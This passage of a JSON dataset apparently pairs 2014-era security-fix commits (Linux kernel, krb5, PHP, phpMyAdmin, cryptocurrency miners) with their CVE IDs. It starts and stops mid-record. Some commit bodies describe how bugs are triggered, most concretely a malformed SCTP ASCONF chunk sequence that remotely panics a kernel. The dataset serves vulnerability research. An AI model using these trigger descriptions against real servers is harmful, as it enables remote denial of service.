Adhemerval Zanella Neto for finding this.Signed-off-by: Michael Neuling <mikey@neuling.org>cc: Adhemerval Zanella Neto <azanella@br.ibm.com>cc: stable@vger.kernel.orgSigned-off-by: Benjamin Herrenschmidt <benh@kernel.crashing.org>",
    "cveIds": [
      "CVE-2014-2673"
    ],
    "cveIdsCount": 1
  },
  "e9c32cbe9daf1371e01024838dd2af5b09233ea496d7688cdb5a83e89f1c8843": {
    "url": "https://github.com/torvalds/linux/commit/b2853fd6c2d0f383dbdf7427e263eb576a633867",
    "title": "IB/core: Don't resolve passive side RoCE L2 address in CMA REQ handler",
    "body": "The code that resolves the passive side source MAC within the rdma_cmconnection request handler was both redundant and buggy, so remove it.It was redundant since later, when an RC QP is modified to RTR state,the resolution will take place in the ib_core module. It was buggybecause this callback also deals with UD SIDR exchange, for which weincorrectly looked at the REQ member of the CM event and dereferenceda random value.Fixes: dd5f03b (\"IB/core: Ethernet L2 attributes in verbs/cm structures\")Signed-off-by: Moni Shoua <monis@mellanox.com>Signed-off-by: Or Gerlitz <ogerlitz@mellanox.com>Signed-off-by: Roland Dreier <roland@purestorage.com>",
    "cveIds": [
      "CVE-2014-2739"
    ],
    "cveIdsCount": 1
  },
  "121c18163d1572809957b78d9adc39b716c43792341f321dcbb7ce68ddc67c24": {
    "url": "https://github.com/esl/MongooseIM/commit/586d96cc12ef218243a3466354b4d208b5472a6c",
    "title": "Merge pull request #167 from esl/zlib_cwe400_fix",
    "body": "Add zlib inflated data size limit",
    "cveIds": [
      "CVE-2014-2829"
    ],
    "cveIdsCount": 1
  },
  "fd1aa9149be28f4b683c16bb63058f9be9e1517a23d393fca59ca1d572f53965": {
    "url": "https://github.com/wikimedia/mediawiki-core/commit/0b695ae09aada343ab59be4a3c9963995a1143b6",
    "title": "SECURITY: escape sortKey in pageInfo",
    "body": "DEFAULTSORT isn't escaped before being added to the action=info table.Bug: 63251Change-Id: I087bfde8cbc69c3507f68ee3cb6e22aba0ffa7db",
    "cveIds": [
      "CVE-2014-2853"
    ],
    "cveIdsCount": 1
  },
  "bddc78dd84a721d8717cf126a1fb20878dceca26c78c73ca3f471f65aeda4fc4": {
    "url": "https://github.com/torvalds/linux/commit/a03ffcf873fe0f2565386ca8ef832144c42e67fa",
    "title": "net: bpf_jit: fix an off-one bug in x86_64 cond jump target",
    "body": "x86 jump instruction size is 2 or 5 bytes (near/long jump), not 2 or 6bytes.In case a conditional jump is followed by a long jump, conditional jumptarget is one byte past the start of target instruction.Signed-off-by: Markus Kötter <nepenthesdev@gmail.com>Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-2889"
    ],
    "cveIdsCount": 1
  },
  "85486bd642ef90c01f386477dcb581f0ec17ec5efe6ef0eda8dad73a7f4958de": {
    "url": "https://github.com/python-pillow/Pillow/commit/205e056f8f9b06ed7b925cf8aa0874bc4aaf8a7d",
    "title": "Icns DOS fix -- CVE-2014-3589",
    "body": "Found and reported by Andrew Drake of dropbox.com",
    "cveIds": [
      "CVE-2014-3589"
    ],
    "cveIdsCount": 1
  },
  "0b8ea34fd9872f8f3e3fcc8fb6f190e828fecda6444f62dd3b331fc4e1993437": {
    "url": "https://github.com/php/php-src/commit/2fefae47716d501aec41c1102f3fd4531f070b05",
    "title": "Fixed Sec Bug #67717 segfault in dns_get_record CVE-2014-3597",
    "body": "Incomplete fix for CVE-2014-4049Check possible buffer overflow- pass real buffer end to dn_expand calls- check buffer len before each read",
    "cveIds": [
      "CVE-2014-3597"
    ],
    "cveIdsCount": 1
  },
  "a64e8b1f2656e55c31177485faa5ad7acd5c6dffd57e0a88a917999fb685680b": {
    "url": "https://github.com/torvalds/linux/commit/350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7",
    "title": "kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-…",
    "body": "…3601)The third parameter of kvm_iommu_put_pages is wrong,It should be 'gfn - slot->base_gfn'.By making gfn very large, malicious guest or userspace can cause kvm togo to this error path, and subsequently to pass a huge value as size.Alternatively if gfn is small, then pages would be pinned but neverunpinned, causing host memory leak and local DOS.Passing a reasonable but large value could be the most dangerous case,because it would unpin a page that should have stayed pinned, and thusallow the device to DMA into arbitrary memory. However, this cannothappen because of the condition that can trigger the error:- out of memory (where you can't allocate even a single page) should not be possible for the attacker to trigger- when exceeding the iommu's address space, guest pages after gfn will also exceed the iommu's address space, and inside kvm_iommu_put_pages() the iommu_iova_to_phys() will fail. The page thus would not be unpinned at all.Reported-by: Jack Morgenstein <jackm@mellanox.com>Cc: stable@vger.kernel.orgSigned-off-by: Michael S. Tsirkin <mst@redhat.com>Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",
    "cveIds": [
      "CVE-2014-3601"
    ],
    "cveIdsCount": 1
  },
  "ebbf98bb182bfd9ff42a2eefd82d305de9dfaa0a395f1ca0399174c8deacd003": {
    "url": "https://github.com/torvalds/linux/commit/bfd0a56b90005f8c8a004baf407ad90045c2b11e",
    "title": "nEPT: Nested INVEPT",
    "body": "If we let L1 use EPT, we should probably also support the INVEPT instruction.In our current nested EPT implementation, when L1 changes its EPT tablefor L2 (i.e., EPT12), L0 modifies the shadow EPT table (EPT02), and inthe course of this modification already calls INVEPT. But if last levelof shadow page is unsync not all L1's changes to EPT12 are intercepted,which means roots need to be synced when L1 calls INVEPT. Global INVEPTshould not be different since roots are synced by kvm_mmu_load() eachtime EPTP02 changes.Reviewed-by: Xiao Guangrong <xiaoguangrong@linux.vnet.ibm.com>Signed-off-by: Nadav Har'El <nyh@il.ibm.com>Signed-off-by: Jun Nakajima <jun.nakajima@intel.com>Signed-off-by: Xinhao Xu <xinhao.xu@intel.com>Signed-off-by: Yang Zhang <yang.z.zhang@Intel.com>Signed-off-by: Gleb Natapov <gleb@redhat.com>Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",
    "cveIds": [
      "CVE-2014-3645"
    ],
    "cveIdsCount": 1
  },
  "72198c4b929d201e44e0a93ca1e8aa00aa2fc30dcab5b8ec55d0b4e8d2091df9": {
    "url": "https://github.com/torvalds/linux/commit/9de7922bc709eee2f609cd01d98aaedc4cf5ea74",
    "title": "net: sctp: fix skb_over_panic when receiving malformed ASCONF chunks",
    "body": "Commit 6f4c618 (\"SCTP : Add paramters validity check forASCONF chunk\") added basic verification of ASCONF chunks, however,it is still possible to remotely crash a server by sending aspecial crafted ASCONF chunk, even up to pre 2.6.12 kernels:skb_over_panic: text:ffffffffa01ea1c3 len:31056 put:30768 head:ffff88011bd81800 data:ffff88011bd81800 tail:0x7950 end:0x440 dev:<NULL> ------------[ cut here ]------------kernel BUG at net/core/skbuff.c:129![...]Call Trace: <IRQ> [<ffffffff8144fb1c>] skb_put+0x5c/0x70 [<ffffffffa01ea1c3>] sctp_addto_chunk+0x63/0xd0 [sctp] [<ffffffffa01eadaf>] sctp_process_asconf+0x1af/0x540 [sctp] [<ffffffff8152d025>] ? _read_unlock_bh+0x15/0x20 [<ffffffffa01e0038>] sctp_sf_do_asconf+0x168/0x240 [sctp] [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp] [<ffffffff8147645d>] ? fib_rules_lookup+0xad/0xf0 [<ffffffffa01e6b22>] ? sctp_cmp_addr_exact+0x32/0x40 [sctp] [<ffffffffa01e8393>] sctp_assoc_bh_rcv+0xd3/0x180 [sctp] [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp] [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp] [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter] [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0 [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0 [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120 [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0 [<ffffffff81496ded>] ip_local_deliver_finish+0xdd/0x2d0 [<ffffffff81497078>] ip_local_deliver+0x98/0xa0 [<ffffffff8149653d>] ip_rcv_finish+0x12d/0x440 [<ffffffff81496ac5>] ip_rcv+0x275/0x350 [<ffffffff8145c88b>] __netif_receive_skb+0x4ab/0x750 [<ffffffff81460588>] netif_receive_skb+0x58/0x60This can be triggered e.g., through a simple scripted nmapconnection scan injecting the chunk after the handshake, forexample, ... -------------- INIT[ASCONF; ASCONF_ACK] -------------> <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------ -------------------- COOKIE-ECHO --------------------> <-------------------- COOKIE-ACK --------------------- ------------------ ASCONF; UNKNOWN ------------------>... where ASCONF chunk of length 280 contains 2 parameters ... 1) Add IP address parameter (param length: 16) 2) Add/del IP address parameter (param length: 255)... followed by an UNKNOWN chunk of e.g. 4 bytes. Here, theAddress Parameter in the ASCONF chunk is even missing, too.This is just an example and similarly-crafted ASCONF chunkscould be used just as well.The ASCONF chunk passes through sctp_verify_asconf() as allparameters passed sanity checks, and after walking, we endedup successfully at the chunk end boundary, and thus may invokesctp_process_asconf(). Parameter walking is done withWORD_ROUND() to take padding into account.In sctp_process_asconf()'s TLV processing, we may fail insctp_process_asconf_param() e.g., due to removal of the IPaddress that is also the source address of the packet containingthe ASCONF chunk, and thus we need to add all TLVs after thefailure to our ASCONF response to remote via helper functionsctp_add_asconf_response(), which basically invokes asctp_addto_chunk() adding the error parameters to the givenskb.When walking to the next parameter this time, we proceedwith ... length = ntohs(asconf_param->param_hdr.length); asconf_param = (void *)asconf_param + length;... instead of the WORD_ROUND()'ed length, thus resulting herein an off-by-one that leads to reading the follow-up garbageparameter length of 12336, and thus throwing an skb_over_panicfor the reply when trying to sctp_addto_chunk() next time,which implicitly calls the skb_put() with that length.Fix it by using sctp_walk_params() [ which is also used inINIT parameter processing ] macro in the verification *and*in ASCONF processing: it will make sure we don't spill over,that we walk parameters WORD_ROUND()'ed. Moreover, we're beingmore defensive and guard against unknown parameter types andmissized addresses.Joint work with Vlad Yasevich.Fixes: b896b82 (\"[SCTP] ADDIP: Support for processing incoming ASCONF_ACK chunks.\")Signed-off-by: Daniel Borkmann <dborkman@redhat.com>Signed-off-by: Vlad Yasevich <vyasevich@gmail.com>Acked-by: Neil Horman <nhorman@tuxdriver.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-3673"
    ],
    "cveIdsCount": 1
  },
  "e9294c904c3280f33c0c9dad63a221b272798ecfeb61a4ecb229201083c7f5d8": {
    "url": "https://github.com/torvalds/linux/commit/26b87c7881006311828bb0ab271a551a62dcceb4",
    "title": "net: sctp: fix remote memory pressure from excessive queueing",
    "body": "This scenario is not limited to ASCONF, just taken as oneexample triggering the issue. When receiving ASCONF probesin the form of ... -------------- INIT[ASCONF; ASCONF_ACK] -------------> <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------ -------------------- COOKIE-ECHO --------------------> <-------------------- COOKIE-ACK --------------------- ---- ASCONF_a; [ASCONF_b; ...; ASCONF_n;] JUNK ------> [...] ---- ASCONF_m; [ASCONF_o; ...; ASCONF_z;] JUNK ------>... where ASCONF_a, ASCONF_b, ..., ASCONF_z are good-formedASCONFs and have increasing serial numbers, we process suchASCONF chunk(s) marked with !end_of_packet and !singleton,since we have not yet reached the SCTP packet end. SCTP doesonly do verification on a chunk by chunk basis, as an SCTPpacket is nothing more than just a container of a stream ofchunks which it eats up one by one.We could run into the case that we receive a packet with amalformed tail, above marked as trailing JUNK. All previouschunks are here goodformed, so the stack will eat up allprevious chunks up to this point. In case JUNK does not fitinto a chunk header and there are no more other chunks inthe input queue, or in case JUNK contains a garbage chunkheader, but the encoded chunk length would exceed the skbtail, or we came here from an entirely different scenarioand the chunk has pdiscard=1 mark (without having had a flushpoint), it will happen, that we will excessively queue upthe association's output queue (a correct final chunk maythen turn it into a response flood when flushing thequeue ;)): I ran a simple script with incremental ASCONFserial numbers and could see the server side consumingexcessive amount of RAM [before/after: up to 2GB and more].The issue at heart is that the chunk train basically endswith !end_of_packet and !singleton markers and since commit2e3216c (\"sctp: Follow security requirement of respondingwith 1 packet\") therefore preventing an output queue flushpoint in sctp_do_sm() -> sctp_cmd_interpreter() on the inputchunk (chunk = event_arg) even though local_cork is set,but its precedence has changed since then. In the normalcase, the last chunk with end_of_packet=1 would trigger thequeue flush to accommodate possible outgoing bundling.In the input queue, sctp_inq_pop() seems to do the right thingin terms of discarding invalid chunks. So, above JUNK willnot enter the state machine and instead be released and exitthe sctp_assoc_bh_rcv() chunk processing loop. It's simplythe flush point being missing at loop exit. Adding a try-flushapproach on the output queue might not work as the underlyinginfrastructure might be long gone at this point due to theside-effect interpreter run.One possibility, albeit a bit of a kludge, would be to deferinvalid chunk freeing into the state machine in order topossibly trigger packet discards and thus indirectly a queueflush on error. It would surely be better to discard chunksas in the current, perhaps better controlled environment, butgoing back and forth, it's simply architecturally not possible.I tried various trailing JUNK attack cases and it seems tolook good now.Joint work with Vlad Yasevich.Fixes: 2e3216c (\"sctp: Follow security requirement of responding with 1 packet\")Signed-off-by: Daniel Borkmann <dborkman@redhat.com>Signed-off-by: Vlad Yasevich <vyasevich@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-3688"
    ],
    "cveIdsCount": 1
  },
  "7de5598b7ddb89232fca121c5f773bacfc0a940220d9ec654a109718c7e8d703": {
    "url": "https://github.com/nilsteampassnet/TeamPass/commit/fd549b245c0f639a8d47bf4f74f92c37c053706f",
    "title": "Several security improvements",
    "body": "New feature: one time item view for anonymous user",
    "cveIds": [
      "CVE-2014-3771",
      "CVE-2014-3774"
    ],
    "cveIdsCount": 2
  },
  "662783784347b5cd9a96fcc33fb983102d4ab815c5158afb9806e9adc106008c": {
    "url": "https://github.com/mayan-edms/mayan-edms/commit/398c480c10416d76e7c1dcb607e726e8fc988e72",
    "title": "Remove the striptags functionality, fixes some instances of XSS, issue …",
    "body": "…#3",
    "cveIds": [
      "CVE-2014-3840"
    ],
    "cveIdsCount": 1
  },
  "27b0a6ed712db340fa62cd9c90b8019ff60567dab735906e242236319fe63260": {
    "url": "https://github.com/djblets/djblets/commit/77a68c03cd619a0996f3f37337b8c39ca6643d6e",
    "title": "Fix a XSS vulnerability with bad input to json_dumps.",
    "body": "Django's JSON serialization does not handle escaping of any charactersto make them safe for injecting into HTML. This allows an attacker whocan provide part of a JSON-serializable object to craft a string thatcan break out of a <script> tag and create its own, injecting a customscript.To fix this, we escape '<', '>', and '&' characters in the resultingstring, preventing a </script> from executing.",
    "cveIds": [
      "CVE-2014-3994"
    ],
    "cveIdsCount": 1
  },
  "19c4b731aedae5a11fae3a1b376db589f3962387fe792414b672af2dc970bd74": {
    "url": "https://github.com/djblets/djblets/commit/77ac64642ad530bf69e390c51fc6fdcb8914c8e7",
    "title": "Fix a XSS vulnerability in the gravatar template tag.",
    "body": "The generated gravatar HTML wasn't handling escaping of the display nameof the user, allowing an attacker to choose a name that would close outthe <img> tag and inject a <script> tag.By switching to Django's format_html(), we can guarantee safe escapingof content.",
    "cveIds": [
      "CVE-2014-3995"
    ],
    "cveIdsCount": 1
  },
  "01a6d2575c9979ab832dd37497554c516e1ec0b72f75894e096bceec5e4586e9": {
    "url": "https://github.com/torvalds/linux/commit/23adbe12ef7d3d4195e80800ab36b37bee28cd03",
    "title": "fs,userns: Change inode_capable to capable_wrt_inode_uidgid",
    "body": "The kernel has no concept of capabilities with respect to inodes; inodesexist independently of namespaces. For example, inode_capable(inode,CAP_LINUX_IMMUTABLE) would be nonsense.This patch changes inode_capable to check for uid and gid mappings andrenames it to capable_wrt_inode_uidgid, which should make it moreobvious what it does.Fixes CVE-2014-4014.Cc: Theodore Ts'o <tytso@mit.edu>Cc: Serge Hallyn <serge.hallyn@ubuntu.com>Cc: \"Eric W. Biederman\" <ebiederm@xmission.com>Cc: Dave Chinner <david@fromorbit.com>Cc: stable@vger.kernel.orgSigned-off-by: Andy Lutomirski <luto@amacapital.net>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2014-4014"
    ],
    "cveIdsCount": 1
  },
  "852f9f0d45430bca4b30e4ea2a2ac236086d46416118a32042e0b29aeede8222": {
    "url": "https://github.com/torvalds/linux/commit/4442dc8a92b8f9ad8ee9e7f8438f4c04c03a22dc",
    "title": "target/rd: Refactor rd_build_device_space + rd_release_device_space",
    "body": "This patch refactors rd_build_device_space() + rd_release_device_space()into rd_allocate_sgl_table() + rd_release_device_space() so that theymay be used seperatly for setup + release of protection informationscatterlists.Also add explicit memset of pages within rd_allocate_sgl_table() basedupon passed 'init_payload' value.v2 changes: - Drop unused sg_table from rd_release_device_space (Wei)Cc: Martin K. Petersen <martin.petersen@oracle.com>Cc: Christoph Hellwig <hch@lst.de>Cc: Hannes Reinecke <hare@suse.de>Cc: Sagi Grimberg <sagig@mellanox.com>Cc: Or Gerlitz <ogerlitz@mellanox.com>Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>",
    "cveIds": [
      "CVE-2014-4027"
    ],
    "cveIdsCount": 1
  },
  "d298738c30c1556d357774a765bdd415d3005a04f15452da0b9c9c6c077c8bcc": {
    "url": "https://github.com/php/php-src/commit/b34d7849ed90ced9345f8ea1c59bc8d101c18468",
    "title": "Merge branch 'PHP-5.6'",
    "body": "* PHP-5.6: Fix potential segfault in dns_get_record()",
    "cveIds": [
      "CVE-2014-4049"
    ],
    "cveIdsCount": 1
  },
  "db64691d41992654fea4f206ca3a9a93b3272693e6a7514ce84aa069fc7050b7": {
    "url": "https://github.com/torvalds/linux/commit/137f7df8cead00688524c82360930845396b8a21",
    "title": "MIPS: asm: thread_info: Add _TIF_SECCOMP flag",
    "body": "Add _TIF_SECCOMP flag to _TIF_WORK_SYSCALL_ENTRY to indicatethat the system call needs to be checked against a seccomp filter.Signed-off-by: Markos Chandras <markos.chandras@imgtec.com>Reviewed-by: Paul Burton <paul.burton@imgtec.com>Reviewed-by: James Hogan <james.hogan@imgtec.com>Cc: linux-mips@linux-mips.orgPatchwork: https://patchwork.linux-mips.org/patch/6405/Signed-off-by: Ralf Baechle <ralf@linux-mips.org>",
    "cveIds": [
      "CVE-2014-4157"
    ],
    "cveIdsCount": 1
  },
  "4d95a2cb22c65fb243344354afa996a1f5cf14f84abe9c8d2edf22340d848395": {
    "url": "https://github.com/krb5/krb5/commit/e6ae703ae597d798e310368d52b8f38ee11c6a73",
    "title": "Handle invalid RFC 1964 tokens [CVE-2014-4341...]",
    "body": "Detect the following cases which would otherwise cause invalid memoryaccesses and/or integer underflow:* An RFC 1964 token being processed by an RFC 4121-only context [CVE-2014-4342]* A header with fewer than 22 bytes after the token ID or an incomplete checksum [CVE-2014-4341 CVE-2014-4342]* A ciphertext shorter than the confounder [CVE-2014-4341]* A declared padding length longer than the plaintext [CVE-2014-4341]If we detect a bad pad byte, continue on to compute the checksum toavoid creating a padding oracle, but treat the checksum as invalideven if it compares equal.CVE-2014-4341:In MIT krb5, an unauthenticated remote attacker with the ability toinject packets into a legitimately established GSSAPI applicationsession can cause a program crash due to invalid memory referenceswhen attempting to read beyond the end of a buffer. CVSSv2 Vector: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:CCVE-2014-4342:In MIT krb5 releases krb5-1.7 and later, an unauthenticated remoteattacker with the ability to inject packets into a legitimatelyestablished GSSAPI application session can cause a program crash dueto invalid memory references when reading beyond the end of a bufferor by causing a null pointer dereference. CVSSv2 Vector: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C[tlyu@mit.edu: CVE summaries, CVSS](cherry picked from commit fb99962)ticket: 7949version_fixed: 1.12.2status: resolved",
    "cveIds": [
      "CVE-2014-4341",
      "CVE-2014-4342"
    ],
    "cveIdsCount": 2
  },
  "00b2af807c32cbeaf7fd94082aafa07fd0202ac3fd5347a10648b4f0c970cd9e": {
    "url": "https://github.com/krb5/krb5/commit/a7886f0ed1277c69142b14a2c6629175a6331edc",
    "title": "Fix null deref in SPNEGO acceptor [CVE-2014-4344]",
    "body": "When processing a continuation token, acc_ctx_cont was dereferencingthe initial byte of the token without checking the length. This couldresult in a null dereference.CVE-2014-4344:In MIT krb5 1.5 and newer, an unauthenticated or partiallyauthenticated remote attacker can cause a NULL dereference andapplication crash during a SPNEGO negotiation by sending an emptytoken as the second or later context token from initiator to acceptor.The attacker must provide at least one valid context token in thesecurity context negotiation before sending the empty token. This canbe done by an unauthenticated attacker by forcing SPNEGO torenegotiate the underlying mechanism, or by using IAKERB to wrap anunauthenticated AS-REQ as the first token. CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C[kaduk@mit.edu: CVE summary, CVSSv2 vector](cherry picked from commit 524688c)ticket: 7970version_fixed: 1.12.2status: resolved",
    "cveIds": [
      "CVE-2014-4344"
    ],
    "cveIdsCount": 1
  },
  "162028cf4c65accf466d7bbbb3d47d9cbfa3cf3bd231d6be2dbb24b39110b122": {
    "url": "https://github.com/krb5/krb5/commit/524688ce87a15fc75f87efc8c039ba4c7d5c197b",
    "title": "Fix null deref in SPNEGO acceptor [CVE-2014-4344]",
    "body": "When processing a continuation token, acc_ctx_cont was dereferencingthe initial byte of the token without checking the length. This couldresult in a null dereference.CVE-2014-4344:In MIT krb5 1.5 and newer, an unauthenticated or partiallyauthenticated remote attacker can cause a NULL dereference andapplication crash during a SPNEGO negotiation by sending an emptytoken as the second or later context token from initiator to acceptor.The attacker must provide at least one valid context token in thesecurity context negotiation before sending the empty token. This canbe done by an unauthenticated attacker by forcing SPNEGO torenegotiate the underlying mechanism, or by using IAKERB to wrap anunauthenticated AS-REQ as the first token. CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C[kaduk@mit.edu: CVE summary, CVSSv2 vector]ticket: 7970 (new)subject: NULL dereference in SPNEGO acceptor for continuation tokens [CVE-2014-4344]target_version: 1.12.2tags: pullup",
    "cveIds": [
      "CVE-2014-4344"
    ],
    "cveIdsCount": 1
  },
  "01b9eb9a2719092ee81501b797f87c56bb5c34e3bfc3f8274694625f04dab0b8": {
    "url": "https://github.com/krb5/krb5/commit/dc7ed55c689d57de7f7408b34631bf06fec9dab1",
    "title": "Fix LDAP key data segmentation [CVE-2014-4345]",
    "body": "For principal entries having keys with multiple kvnos (due to use of-keepold), the LDAP KDB module makes an attempt to store all the keyshaving the same kvno into a single krbPrincipalKey attribute value.There is a fencepost error in the loop, causing currkvno to be set tothe just-processed value instead of the next kvno. As a result, thesecond and all following groups of multiple keys by kvno are eachstored in two krbPrincipalKey attribute values. Fix the loop to usethe correct kvno value.CVE-2014-4345:In MIT krb5, when kadmind is configured to use LDAP for the KDCdatabase, an authenticated remote attacker can cause it to perform anout-of-bounds write (buffer overrun) by performing multiple cpw-keepold operations. An off-by-one error while copying keyinformation to the new database entry results in keys sharing a commonkvno being written to different array buckets, in an array whose sizeis determined by the number of kvnos present. After sufficientiterations, the extra writes extend past the end of the(NULL-terminated) array. The NULL terminator is always written afterthe end of the loop, so no out-of-bounds data is read, it is onlywritten.Historically, it has been possible to convert an out-of-bounds writeinto remote code execution in some cases, though the necessaryexploits must be tailored to the individual application and areusually quite complicated. Depending on the allocated length of thearray, an out-of-bounds write may also cause a segmentation faultand/or application crash. CVSSv2 Vector: AV:N/AC:M/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C[ghudson@mit.edu: clarified commit message][kaduk@mit.edu: CVE summary, CVSSv2 vector](cherry picked from commit 81c332e)ticket: 7980version_fixed: 1.12.2status: resolved",
    "cveIds": [
      "CVE-2014-4345"
    ],
    "cveIdsCount": 1
  },
  "e535ecb245128d877f5bad28e49b6e97c41dfc0e1c529ca3bb672e82c93f4727": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/cb7c703c03f656debcea2a16468bd53660fc888e",
    "title": "Fix XSS in recent/favorite tables list feature",
    "body": "Signed-off-by: Ann + J.M <phpMyAdmin@ZweiSteinSoft.de>",
    "cveIds": [
      "CVE-2014-4348"
    ],
    "cveIdsCount": 1
  },
  "2bd6444bb424cadac7b43593be94a177c0d253bccf915273b21e892734415516": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/d18a2dd9faad7e0e96df799b59e16ef587afb838",
    "title": "Fix XSS in PMA_RecentFavoriteTable::getHtmlList()",
    "body": "Signed-off-by: Ann + J.M <phpMyAdmin@ZweiSteinSoft.de>",
    "cveIds": [
      "CVE-2014-4348"
    ],
    "cveIdsCount": 1
  },
  "e97407afe398cc8046f28241c8404effdd7c93525a31a2d3d0a6d795b2dec582": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/daa98d0c7ed24b529dc5df0d5905873acd0b00be",
    "title": "Fix XSS in Hide navigation items feature",
    "body": "Signed-off-by: Ann + J.M <phpMyAdmin@ZweiSteinSoft.de>",
    "cveIds": [
      "CVE-2014-4349"
    ],
    "cveIdsCount": 1
  },
  "d51f3f0f25ee53c182cdabe41f505e3f6c0388398a26f936de396e889da8cfca": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/d4f754c937f9e2c0beadff5b2e38215dde1d6a79",
    "title": "Fix XSS in Hide navigation items feature",
    "body": "Signed-off-by: Ann + J.M <phpMyAdmin@ZweiSteinSoft.de>",
    "cveIds": [
      "CVE-2014-4349"
    ],
    "cveIdsCount": 1
  },
  "e1d60205b18996273f343a38dd722cfa1058aee184e0b20c494e8c9484374d04": {
    "url": "https://github.com/luke-jr/bfgminer/commit/c80ad8548251eb0e15329fc240c89070640c9d79",
    "title": "Stratum: extract_sockaddr: Truncate overlong addresses rather than st…",
    "body": "…ack overflowThanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!",
    "cveIds": [
      "CVE-2014-4501"
    ],
    "cveIdsCount": 1
  },
  "e8317f8c927d617d6abcd44bd43d188187f01062ec61808faf5620fca8b01fbb": {
    "url": "https://github.com/sgminer-dev/sgminer/commit/78cc408369bdbbd440196c93574098d1482efbce",
    "title": "stratum: parse_reconnect(): treat pool-sent URL as untrusted.",
    "body": "Thanks to Mick Ayzenberg <mick@dejavusecurity.com> for remindingthat this existed and highlighting the offender.Also to Luke-jr for actually fixing this in bfgminer. :D",
    "cveIds": [
      "CVE-2014-4501"
    ],
    "cveIdsCount": 1
  },
  "88360a5c3d14c04776124c9fd02dc293d70fef5a1191671f8bbf5b5f6d765256": {
    "url": "https://github.com/sgminer-dev/sgminer/commit/b65574bef233474e915fdf18614aa211e31cc6c2",
    "title": "Stratum: extract_sockaddr: Truncate overlong addresses rather than st…",
    "body": "…ack overflowThanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!",
    "cveIds": [
      "CVE-2014-4501"
    ],
    "cveIdsCount": 1
  },
  "f5c658f5140a8892c5bd3f1f67ef56d90e7f803d4e6f6ca04561da3633a7bf77": {
    "url": "https://github.com/sgminer-dev/sgminer/commit/bac5831b355f916e0696b7bbcccfc51c057b729a",
    "title": "Bugfix: initiate_stratum: Ensure extranonce2 size is not negative (wh…",
    "body": "…ich could lead to exploits later as too little memory gets allocated)Thanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!",
    "cveIds": [
      "CVE-2014-4502"
    ],
    "cveIdsCount": 1
  },
  "847cf811acb29a0e1aaee8e71d4d0bb5f15d0101f79071d501ec7d1715dc5f99": {
    "url": "https://github.com/luke-jr/bfgminer/commit/ff7f30129f15f7a2213f8ced0cd65c9a331493d9",
    "title": "Bugfix: initiate_stratum: Ensure extranonce2 size is not negative (wh…",
    "body": "…ich could lead to exploits later as too little memory gets allocated)Thanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!",
    "cveIds": [
      "CVE-2014-4502"
    ],
    "cveIdsCount": 1
  },
  "858bc0ddb85e578c65a047e16f101c05d694681f979dc9724889e96f112f7eda": {
    "url": "https://github.com/sgminer-dev/sgminer/commit/910c36089940e81fb85c65b8e63dcd2fac71470c",
    "title": "stratum: parse_notify(): Don't die on malformed bbversion/prev_hash/n…",
    "body": "…bit/ntime.Might have introduced a memory leak, don't have time to check. :(Should the other hex2bin()'s be checked?Thanks to Mick Ayzenberg <mick.dejavusecurity.com> for finding this.",
    "cveIds": [
      "CVE-2014-4503"
    ],
    "cveIdsCount": 1
  },
  "7459f98e54a406b463cca960330c4b841e157e2416692c21156ad9892d02c108": {
    "url": "https://github.com/torvalds/linux/commit/206a81c18401c0cde6e579164f752c4b147324ce",
    "title": "lzo: properly check for overruns",
    "body": "The lzo decompressor can, if given some really crazy data, possiblyoverrun some variable types. Modify the checking logic to properlydetect overruns before they happen.Reported-by: \"Don A. Bailey\" <donb@securitymouse.com>Tested-by: \"Don A. Bailey\" <donb@securitymouse.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2014-4608"
    ],
    "cveIdsCount": 1
  },
  "c846c41ff7bff521d670992a924d9b5784ae10840c5bf6391d10d66e4165f116": {
    "url": "https://github.com/torvalds/linux/commit/206204a1162b995e2185275167b22468c00d6b36",
    "title": "lz4: ensure length does not wrap",
    "body": "Given some pathologically compressed data, lz4 could possibly decide towrap a few internal variables, causing unknown things to happen. Catchthis before the wrapping happens and abort the decompression.Reported-by: \"Don A. Bailey\" <donb@securitymouse.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2014-4611"
    ],
    "cveIdsCount": 1
  },
  "7ff7e71757a0242731033deec87a34acc626b089af8c5a1e0907be1549b4aa7d": {
